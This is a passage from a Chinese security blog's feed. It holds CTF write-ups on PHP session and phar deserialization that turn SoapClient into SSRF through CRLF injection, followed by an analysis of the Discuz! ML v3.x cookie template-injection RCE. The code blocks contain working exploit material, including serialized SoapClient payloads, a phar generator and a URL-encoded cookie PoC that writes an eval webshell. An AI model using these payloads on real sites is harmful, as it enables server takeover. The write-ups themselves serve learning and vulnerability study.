class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[f], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[name]))&#123;</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session_start(); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] === <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">    $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目非常简洁，就两个文件。flag 的位置也很明确，但这有一个限制，只有来自 localhost 的访问才能将 flag 写入 session 中，意味着需要 SSRF 或者直接 getshell。</p><p>给的提示是反序列化，代码不多，不由得想到 session 里的反序列化，可以看看之前的一个题，<a href="https://wywwzjj.top/2019/02/25/Jarvis-OJ-phpinfo/">从 session 角度学习反序列化</a> （与此题不相同的一点是，这里直接给了写 session 的接口，两题或许可以结合一下）</p><p>参照以前的思路，我们需要设置不同的序列化的处理器，来达到对象注入的目的。如何才能设置呢？</p><p>目光继续聚焦于 <code>session_start</code> ，官方文档给了一个重要提示：配置可覆盖（该进程下临时生效就够了）。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y600aa7cj20t90h6jut.jpg" alt></p><p>那要注入什么要的对象才能达到 SSRF 的目的呢？由于不能定义其他类，只好从内置类想办法，这时候 SoapClient 就可以闪亮登场了，上面已经铺垫了相关知识，这里着重解释处理手法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, [<span class="string">'location'</span> =&gt; <span class="string">'http://127.0.0.1/flag.php'</span>,</span><br><span class="line">                           <span class="string">'uri'</span> =&gt; <span class="string">"DDD\r\n"</span> . <span class="string">"Cookie: PHPSESSID=2"</span>]);</span><br><span class="line">   <span class="comment">// 别忘了带 Cookie，不然去哪看 flag ：)</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line"></span><br><span class="line"><span class="comment">//O%3A10%3A%22SoapClient%22%3A3%3A%7Bs%3A3%3A%22uri%22%3Bs%3A24%3A%22DDD%0D%0ACookie%3A+PHPSESSID%3D2%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span></span><br></pre></td></tr></table></figure><p>可看到语句成功写入 session</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y6ncawvjj20yr0h2n0y.jpg" alt></p><p>再正常访问一下，session 里的语句被成功反序列化成为 SoapClient 对象</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y6pukr6vj20yo0hjn03.jpg" alt></p><p>有人可能还是会有疑问，为什么一定要这样设置呢，不能赋值进去再自动反序列化吗？</p><p>这里多说一下，其实上面的文章已经有写过。先看一下基本的几种序列化的存储方式：</p><ul><li><code>php_binary</code>：键名的长度对应的 ASCII 字符 + 键名 + 经过 <code>serialize ()</code> 函数序列化处理的值</li><li><code>php</code>：键名 + 竖线 + 经过 <code>serialize ()</code> 函数序列处理的值</li><li><code>php_serialize</code> ：经过 <code>serialize ()</code> 函数序列化处理的值</li></ul><p>从 PHP 文档可查到，默认使用 php 这种序列化格式，也就是已经存在竖线的那种方式。</p><p>这种方式的反序列化有个小细节：PHP 获取到 session 字符串后就开始从左至右寻找竖线，找到后以竖线为分隔符，竖线前的为键名，后的做键值，并对键值进行反序列化。如果反序列化失败，则放弃此次解析，再以这样的方式网下寻找继续找。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">name</span>|<span class="selector-tag">s</span><span class="selector-pseudo">:163</span><span class="selector-pseudo">:"</span>|<span class="selector-tag">O</span><span class="selector-pseudo">:10</span><span class="selector-pseudo">:"SoapClient"</span><span class="selector-pseudo">:4</span>:&#123;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"uri"</span>;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">"a"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"location"</span>...</span><br></pre></td></tr></table></figure><p>像现在这种情况，出现了两个竖线，就会将后面整个 <code>s:163:&quot;O:&quot;</code> 字符串进行反序列化，得到的很可能就只是一个数组。</p><p>到这里，我们的对象注入总算是成功了，那该如何调用 <code>__call</code> 呢？</p><p>别忘了这还有一个 <code>reset</code> 函数：</p><blockquote><p><strong>reset()</strong> 将 <code>array</code> 的内部指针倒回到第一个单元并返回第一个数组单元的值</p></blockquote><p>也就是说，<code>reset($_SESSION)</code> 将返回的就是 SoapClient 对象，这就很棒了，得来全不费功夫。</p><p>我们可以先把 <code>$b</code> 覆盖成 <code>call_user_func</code> ，以下面这种形式进行调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="keyword">array</span>(SoapClient Object, <span class="string">'welcome_to_the_lctf2018'</span>));</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y6vceceuj20yn0h2goc.jpg" alt></p><p>再正常访问就可以看到 flag 了。</p><h3 id="2019-SUCTF-upload2"><a href="#2019-SUCTF-upload2" class="headerlink" title="2019 SUCTF upload2"></a>2019 SUCTF upload2</h3><blockquote><p>考点：phar 反序列化、反射、SSRF、SoapClient</p></blockquote><p>简单说一下题目大意，有一个上传点（index.php），限制了图片后缀。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"upload"</span>])) &#123;</span><br><span class="line">    <span class="comment">// 允许上传的图片后缀</span></span><br><span class="line">    $allowedExts = <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>);</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $file_name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    $temp = explode(<span class="string">"."</span>, $file_name);</span><br><span class="line">    $extension = end($temp);</span><br><span class="line">    <span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">        &amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>)   <span class="comment">// 小于 200 kb</span></span><br><span class="line">        &amp;&amp; in_array($extension, $allowedExts)</span><br><span class="line">    ) &#123;</span><br><span class="line">        $c = <span class="keyword">new</span> Check($tmp_name);</span><br><span class="line">        $c-&gt;check();</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"错误：: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            move_uploaded_file($tmp_name, $userdir . <span class="string">"/"</span> . md5($file_name) . <span class="string">"."</span> . $extension);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"文件存储在: "</span> . $userdir . <span class="string">"/"</span> . md5($file_name) . <span class="string">"."</span> . $extension;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"非法的文件格式"</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>check（class.php）里检查了是否含有 <code>&lt;?</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line">    <span class="keyword">public</span> $type;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"Check"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">        $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        $a-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getMIME</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;type = finfo_file($finfo, <span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;type;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $data = file_get_contents(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        <span class="keyword">if</span> (mb_strpos($data, <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&amp;lt;? in contents!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外还有一个查看点（func.php）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i'</span>,$_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Go away!"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $file_path = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    $file = <span class="keyword">new</span> File($file_path);</span><br><span class="line">    $file-&gt;getMIME();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your file type is '$file' &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目标在 admin.php 里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="comment">// 拿 flag</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由此可知只能打 SSRF，加上前面的一系列限制，直接传 webshell 是不太现实的。</p><p>综合总的题目情景，前一部分和 hitcon 2017 中的 baby^h-master-php-2017 很像，可由 <code>finfo_file($finfo, $this-&gt;file_name)</code> 触发反序列化，再通过 soap 打出 SSRF。</p><p>以下直接给出 exp：（具体分析可参考 De1ta 的 <a href="https://xz.aliyun.com/t/6042#toc-27" target="_blank" rel="noopener">wp</a>）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'test.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">'__HALT_COMPILER();'</span>);  <span class="comment">// 并不需要加 <span class="meta">&lt;?</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"SoapClient"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $target = <span class="string">"http://127.0.0.1/admin.php"</span>;</span><br><span class="line">        $post_string = <span class="string">'admin=&amp;ip=xxx&amp;port=xx&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='</span>. <span class="string">"\r\n"</span>;</span><br><span class="line">        $headers = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name  = [</span><br><span class="line">            <span class="keyword">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">                  <span class="string">'user_agent'</span>=&gt; str_replace(<span class="string">'^^'</span>, <span class="string">"\r\n"</span>, <span class="string">'xxxxx^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'Content-Length: '</span>. (string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string),</span><br><span class="line">                  <span class="string">'uri'</span>=&gt;<span class="string">'1'</span>)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = <span class="keyword">new</span> File;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($object));</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>另外还有一些例题，比如：</p><ul><li><p>2018 N1CTF Easy&amp;&amp;Hard PHP</p></li><li><p>2019 De1taCTF shellshellshell</p></li></ul><p>简单小结一下，这些题的情景大都是这样：</p><p>最终目标都受到了 IP 的限制，往往需要打出 SSRF，但并没有找到明显的 SSRF 点，只有一个反序列化的，此时该如何利用呢？</p><p>都指向了原生类——SOAPClient，有了两个 CRLF 的助攻，打出去的 POST 报文几乎完全可控。</p><p>这样的 SOAP，你喜欢吗 ：）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://pupiles.com/lctf2018.html" target="_blank" rel="noopener">http://pupiles.com/lctf2018.html</a></p><p><a href="https://blog.wonderkun.cc/2018/03/13/n1ctf-hard-php-writeup/" target="_blank" rel="noopener">https://blog.wonderkun.cc/2018/03/13/n1ctf-hard-php-writeup/</a></p><p><a href="https://www.kingkk.com/2018/11/2018-lctf-web-学习篇/" target="_blank" rel="noopener">https://www.kingkk.com/2018/11/2018-lctf-web-学习篇/</a></p><p><a href="https://www.anquanke.com/post/id/164569" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164569</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SOAP-简介&quot;&gt;&lt;a href=&quot;#SOAP-简介&quot; class=&quot;headerlink&quot; title=&quot;SOAP 简介&quot;&gt;&lt;/a&gt;SOAP 简介&lt;/h2&gt;&lt;p&gt;SOAP（Simple Object Access Protocol）是一种在 web servic
      
    
    </summary>
    
    
      <category term="反序列化" scheme="https://wywwzjj.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="php" scheme="https://wywwzjj.top/tags/php/"/>
    
      <category term="SSRF" scheme="https://wywwzjj.top/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>Discuz ML! V3.X RCE</title>
    <link href="https://wywwzjj.top/2019/07/18/Discuz%20ML!%20V3.X%20RCE/"/>
    <id>https://wywwzjj.top/2019/07/18/Discuz ML! V3.X RCE/</id>
    <published>2019-07-18T15:34:37.000Z</published>
    <updated>2020-01-21T15:06:29.411Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Discuz！ML 是一个由 CodersClub.org 创建的多语言，集成，功能齐全的开源网络平台，用于构建像 “社交网络” 这样的互联网社区。该引擎基于 Comsenz Inc. 创建的着名的 Discuz！X 引擎开发。</p><p>但是，这与常见的 Discuz 论坛还是没多大关系。</p><p><strong>影响版本</strong></p><p>Discuz! ML v.3.4</p><p>Discuz! ML v.3.3</p><p>Discuz! ML v.3.2</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>简单来说，没有经过任何处理的 cookie 直接被拼接进模板，该模板被 include 后自然就执行了。</p><p>（不愧是官方的 Demo）</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58e9notqaj216u07wwfy.jpg" alt></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>主入口是 upload 目录下的 index.php，没有任何参数的情况下直接载入 forum.php</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58ftdlnenj20kp01y3yi.jpg" alt></p><p>紧接着 forum.php 又加载了两个核心文件，好戏就要开始了。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58gas4s7mj20ea026weg.jpg" alt></p><p>class_core.php 中的 39 行 <code>createapp()</code> 开始实例化一个超级对象，再跟一下构造函数</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58gezo0iij20fn05r0t1.jpg" alt></p><p>环境变量一些初始化以及输入输出的处理全是在这里完成的，焦点锁定到 <code>_init_input()</code> </p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58gki346wj20kz03owes.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58gpf4h2kj20gt0200sr.jpg" alt></p><p>找找这个可控点被用在什么地方</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58grpn35oj20uq0jfq50.jpg" alt></p><p>其他地方都是包含，这里有个缓存文件，先不管，继续跟，发现开始加载 forum_index.php</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5a8i1nm7dj20ib01y3yg.jpg" alt></p><p>form_index.php 的 433 行开始加载模板</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> template(<span class="string">'diy:forum/discuz:'</span>.$gid);</span><br></pre></td></tr></table></figure><p>之前的那个可控点在这里出现了</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5a8lkglfpj213c00wt8t.jpg" alt></p><p>紧接着被传入了这个函数之中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checktplrefresh($tplfile, $tplfile, @filemtime(DISCUZ_ROOT . $cachefile), $templateid, $cachefile, $tpldir, $file);</span><br></pre></td></tr></table></figure><p>继续跟，在 function_core.php 中的第 523 行 <code>cachefile</code> 被传入进行解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$template-&gt;parse_template($maintpl, $templateid, $tpldir, $file, $cachefile);</span><br></pre></td></tr></table></figure><p>在 class_template.php 中，读取了一下原有的模板</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dm9l9v9uj20ti02ijrz.jpg" alt></p><p>接着用正则进行替换</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dmbin23bj212r0alaem.jpg" alt></p><p>末尾将写入文件</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dmmlm5z6j20i502gjrg.jpg" alt></p><p>接下来到了激动人心的时刻，这里将拼接我们的恶意语句进入模板</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5a8t4mytgj212d04fwfb.jpg" alt></p><p>但是第一次并不会直接拼接，因为这时候的子模板并没生成，这里先留个印象。</p><p><code>template()</code>将返回一个绝对路径，然后被包含，这时候会执行之前生成的模板，这里继续加载模板。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dmgzw8lxj21ar0i20wh.jpg" alt></p><p>直到这一次加载，恶意语句才真正写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$headeradd = <span class="string">"</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">|| checktplrefresh('./template/default/common/header.htm', './template/default/common/header_common.htm', 1564153001, '', './data/template/en'.phpinfo().'___common_header_forum_index.tpl.php', './template/default', 'common/header_forum_index')</span></span><br><span class="line"><span class="string">|| checktplrefresh('./template/default/common/header.htm', './template/default/common/header_qmenu.htm', 1564153002, '', './data/template/en'.phpinfo().'___common_header_forum_index.tpl.php', './template/default', 'common/header_forum_index')</span></span><br><span class="line"><span class="string">|| checktplrefresh('./template/default/common/header.htm', './template/default/common/pubsearchform.htm', 1564153002, '', './data/template/en'.phpinfo().'___common_header_forum_index.tpl.php', './template/default', 'common/header_forum_index')</span></span><br><span class="line"><span class="string">;"</span></span><br></pre></td></tr></table></figure><p>可看到具体的位置</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dmpsp4yej21fc04m3zq.jpg" alt></p><p>简化一下就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checktplrefresh(<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="number">1564153002</span>, <span class="string">''</span>, <span class="string">'3'</span>.phpinfo().<span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>)</span><br></pre></td></tr></table></figure><p>自然 <code>phpinfo()</code> 的内容就被拼接到了模板文件中</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dnd8cpnrj20am03mmx3.jpg" alt></p><p>最初生成的文件中还有加载了其他模板，接二连三就生成了好几个文件，最终形成了展示的页面。</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>由于 cookie 中不能有大写字母，写 webshell 时自然不能直接写，这里可以使用 URL 编码来解决。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">27.</span>file_put_contents%<span class="number">28</span>%<span class="number">27</span>confi9.php%<span class="number">27</span>%<span class="number">2</span>Curldecode%<span class="number">28</span>%<span class="number">27</span>%<span class="number">253</span>c%<span class="number">253</span>fphp+%<span class="number">2520</span><span class="keyword">eval</span>%<span class="number">28</span>%<span class="number">2524</span>_%<span class="number">2550</span>%<span class="number">254</span>f%<span class="number">2553</span>%<span class="number">2554</span>%<span class="number">255</span>b1%<span class="number">255</span>d%<span class="number">29</span>%<span class="number">253</span>b%<span class="number">253</span>f%<span class="number">253</span>e%<span class="number">27</span>%<span class="number">29</span>%<span class="number">29.</span>%<span class="number">27</span></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最初的可控变量被拼接到模板中，再加上生成的模板被包含，此时恶意代码就生效了，导致代码注入。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;Discuz！ML 是一个由 CodersClub.org 创建的多语言，集成，功能齐全的开源网络平台，用于构建像 “社交网络” 这样的互联
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="https://wywwzjj.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://wywwzjj.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP 写入配置文件经典问题</title>
    <link href="https://wywwzjj.top/2019/07/11/PHP-%E5%86%99%E5%85%A5%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BB%8F%E5%85%B8%E9%97%AE%E9%A2%98/"/>
    <id>https://wywwzjj.top/2019/07/11/PHP-写入配置文件经典问题/</id>
    <published>2019-07-11T01:36:48.000Z</published>
    <updated>2019-08-26T06:14:57.712Z</updated>
    
